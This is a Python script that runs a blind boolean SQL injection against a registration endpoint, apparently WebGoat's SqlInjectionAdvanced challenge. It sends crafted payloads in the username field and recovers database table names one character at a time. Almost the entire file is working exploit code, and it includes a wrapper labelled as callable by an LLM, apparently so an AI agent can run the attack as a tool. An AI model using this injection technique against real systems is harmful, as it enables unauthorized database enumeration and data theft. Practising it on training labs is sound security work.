import json
import requests
import os
import sys

# Add the parent directory to the Python path for importing config
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Config

# Load configurations
SERVER_URL = Config.SERVER_URL
SESSION_COOKIE = Config.SESSION_COOKIE


# Function to perform SQL injection to discover table names
def table_names():
    # Set of characters to try for table name discovery
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
    
    # Headers for the HTTP request (include a session ID here)
    headers = {  
        'Cookie': SESSION_COOKIE,
    }

    # Function to check if a character exists at a specific position in the table name
    def does_character_exist_at_position(guess_char, char_position, table_offset):
        # Crafting a payload to perform SQL injection, where the substring function is used to extract character
        injection_payload = "' OR (SELECT substring(table_name, {}, 1) FROM information_schema.tables LIMIT 1 OFFSET {}) = '{}' --".format(
            char_position, table_offset, guess_char
        )
        # Data to be sent in the request
        request_data = {
            'username_reg': injection_payload,
            'email_reg': 'tom@gmail.com',
            'password_reg': 'x',
            'confirm_password_reg': 'x'
        }
        
        try:
            # Send a PUT request to the target URL with the payload and headers
            response = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=request_data)
            response.raise_for_status()  # Raises HTTPError for bad responses (4xx or 5xx)
        except requests.RequestException as e:
            print(f"Network or request error occurred: {e}")
            return False

        try:
            # Try to parse the response as JSON and check if the guess was correct
            response_json = json.loads(response.text)
        except json.JSONDecodeError:
            print("Failed to decode JSON response.")
            return False

        # Return True if the feedback indicates that the guessed character is correct
        return "already exists" in response_json.get('feedback', '')

    # Open a file to store discovered table names
    try:
        with open("found_table_names.txt", "w") as file:
            table_names = []
            table_offset = 0  # Offset to track the position of tables
            while True:
                current_table_name = ''  # Holds the name of the table being discovered
                char_position = 1  # Tracks the character position in the table name

                # Discover characters of the current table name
                while True:
                    character_found = False
                    for char in charset:
                        # Check if the character at the current position matches
                        if does_character_exist_at_position(char, char_position, table_offset):
                            current_table_name += char
                            # print(f"Current table name being found: {current_table_name}")
                            char_position += 1
                            character_found = True
                            break

                    # If no valid character was found, end the current table discovery
                    if not character_found:
                        if current_table_name:
                            print(f"Table discovered: {current_table_name}")
                            file.write(f"{current_table_name}\n")
                            table_names.append(current_table_name)
                        break

                # Stop the loop if no more tables are found
                if not current_table_name:
                    print("No further tables found.")
                    break

                # Move to the next table in the list
                table_offset += 1
    except IOError as e:
        print(f"Error opening or writing to file: {e}")
    return table_names


# Callable function for LLM integration
def discover_and_return_table_names():
    """
    LLM-friendly callable wrapper function.
    """
    try:
        with open('found_table_names.txt', 'r') as file:
            tables = [line.strip() for line in file.readlines()]
            if tables == [ ] : 
                tables = table_names()    
        return {"status": "success", "discovered_tables": tables}
    except Exception as e:
        return {"status": "error", "message": str(e)}


if __name__ == "__main__":
    try:
        tables = table_names()
        print(f"\nDiscovered tables: {tables}")
    except Exception as e:
        print(f"Error during execution: {e}")
